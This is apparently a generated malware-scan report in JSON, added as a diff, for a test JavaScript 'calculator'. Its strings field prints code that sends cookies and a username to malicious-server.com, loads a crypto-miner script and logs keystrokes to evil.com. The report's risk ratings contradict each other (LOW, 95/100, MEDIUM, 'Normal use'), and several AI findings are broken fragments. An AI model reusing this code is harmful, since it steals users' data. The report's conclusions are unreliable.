@@ -1,0 +1,152 @@
+{
+  "static_analysis": {
+    "filename": "5c89448a-3b3c-4f88-895f-23f223e9ddf8_test.js",
+    "size": 754,
+    "suspicious_indicators": [],
+    "suspicious_strings": [
+      "https:// - HTTPS URL"
+    ],
+    "yara_matches": [],
+    "entropy": 4.677426634866945,
+    "embedded_urls": [
+      "https://malicious-server.com/steal",
+      "https://crypto-miner.net/payload.js",
+      "https://evil.com/log"
+    ],
+    "ip_addresses": [],
+    "email_addresses": [],
+    "file_signatures": [],
+    "file_type": "ASCII text, with CRLF line terminators",
+    "mime_type": "text/plain",
+    "md5": "47ded633a6b0172bf8dacecc48784673",
+    "sha1": "57ebdd8be0c150f7f882d267bfb7817836cca8f1",
+    "sha256": "4252fafe6e2c126a897bf04a370bc8d46a39fb4ff4f9615ce42852e191791bc7",
+    "all_strings": [
+      "// Simple calculator with hidden malware",
+      "function calculate(op, a, b) {",
+      "    // Steals user data",
+      "    fetch('https://malicious-server.com/steal', {",
+      "        method: 'POST',",
+      "        body: JSON.stringify({",
+      "            user: document.getElementById('user')?.value,",
+      "            cookies: document.cookie",
+      "        })",
+      "    });",
+      "    ",
+      "    // Hidden miner",
+      "    document.head.appendChild(",
+      "        Object.assign(document.createElement('script'), {",
+      "            src: 'https://crypto-miner.net/payload.js'",
+      "        })",
+      "    );",
+      "    ",
+      "    // Calculator logic",
+      "    return op === 'add' ? a + b :",
+      "           op === 'sub' ? a - b : 'invalid';",
+      "// Keylogger",
+      "document.addEventListener('keypress', e => ",
+      "    navigator.sendBeacon('https://evil.com/log', e.key)"
+    ],
+    "risk_level": "LOW"
+  },
+  "behavioral_analysis": {
+    "suspicious_activity": [
+      "System config modification: /etc/terminfo"
+    ],
+    "file_operations": [
+      "/tmp/5c89448a-3b3c-4f88-895f-23f223e9ddf8_test.js",
+      "/etc/terminfo"
+    ],
+    "process_operations": [],
+    "network_attempts": [],
+    "registry_operations": [],
+    "system_calls": [],
+    "execution_success": false,
+    "quick_check": true
+  },
+  "ai_analysis": {
+    "vulnerabilities": [
+      {
+        "description": "Type:** Cross-Site Scripting (XSS) & Data Exfiltration",
+        "severity": "Medium"
+      },
+      {
+        "description": "Severity:** High",
+        "severity": "High"
+      },
+      {
+        "description": "Description:** The script attempts to steal user data (username from an element with ID 'user' and cookies) and send it to a malicious server (`malicious-server.com`). This is a classic data exfiltration technique leveraging XSS.  The script relies on the presence of an element with ID 'user' which could be present on a compromised webpage.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Type:** Drive-by Mining (Cryptojacking)",
+        "severity": "Medium"
+      },
+      {
+        "description": "Severity:** Medium",
+        "severity": "Medium"
+      },
+      {
+        "description": "Phishing:** The script could be delivered via a phishing email containing a link to a malicious website hosting the script.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Malvertising:**  The script could be embedded in malicious advertisements displayed on legitimate websites.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Software Supply Chain Attack:** The script could be included as part of a compromised third-party library or component used by a website.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Input Validation & Output Encoding:** Implement robust input validation and output encoding to prevent XSS attacks.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Least Privilege Principle:**  Ensure that applications and users have only the minimum necessary privileges to perform their tasks.  This is *critical* given the `terminfo` modification.",
+        "severity": "Critical"
+      },
+      {
+        "description": "Security Awareness Training:** Educate users about phishing attacks and other social engineering techniques.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Monitor System Files:** Implement file integrity monitoring to detect unauthorized changes to critical system files like `/etc/terminfo`.",
+        "severity": "Critical"
+      },
+      {
+        "description": "Important Note:** The `/etc/terminfo` modification is a significant red flag. It suggests a much deeper compromise than a typical XSS attack. A thorough forensic investigation is required to determine the root cause and extent of the compromise.  This is not just a web application issue; it's a potential system-level breach.",
+        "severity": "Medium"
+      }
+    ],
+    "risk_assessment": "Score:** 95/100 Rationale:** The script exhibits multiple malicious behaviors, including data theft, cryptojacking, keylogging, and *system configuration modification*. The combination of these activities, particularly the `terminfo` modification, indicates a sophisticated and dangerous threat. The failure of execution suggests a potential attempt or a partially successful compromise. The risk is extremely high due to the potential for significant data loss, system compromise, and ongoing malicious activity. The fact that it attempted to modify a system file elevates the risk dramatically. ",
+    "recommendations": [
+      "Mitigation (Immediate Actions):",
+      "Isolate Affected Systems:** If the `/etc/terminfo` modification occurred on a server, immediately isolate it from the network to prevent further damage.",
+      "Restore from Backup:** Restore the `/etc/terminfo` file from a known good backup.",
+      "Scan for Persistence:** Thoroughly scan the system for any other signs of compromise or persistence mechanisms.",
+      "Detection:",
+      "Web Application Firewall (WAF):** Implement a WAF to detect and block malicious JavaScript code, including attempts to inject miners or exfiltrate data.",
+      "Intrusion Detection/Prevention System (IDS/IPS):** Configure IDS/IPS to detect network traffic to known malicious domains (e.g., `malicious-server.com`, `crypto-miner.net`, `evil.com`).",
+      "Endpoint Detection and Response (EDR):** Deploy EDR solutions to monitor endpoint activity for suspicious behavior, such as unauthorized file modifications and network connections.",
+      "Content Security Policy (CSP):** Implement a strong CSP to restrict the sources from which the browser can load resources, mitigating XSS attacks.",
+      "Prevention:"
+    ],
+    "threat_vectors": [],
+    "analysis_time": 30.73311424255371,
+    "model_used": "gemma-3-27b-it",
+    "impact_analysis": {}
+  },
+  "risk_score": 40,
+  "threat_level": "MEDIUM",
+  "summary": {
+    "quick_verdict": "Risk detected",
+    "key_findings": [
+      "MEDIUM risk level detected"
+    ],
+    "risk_breakdown": {
+      "score": 40
+    },
+    "action_required": "Normal use"
+  }
+}
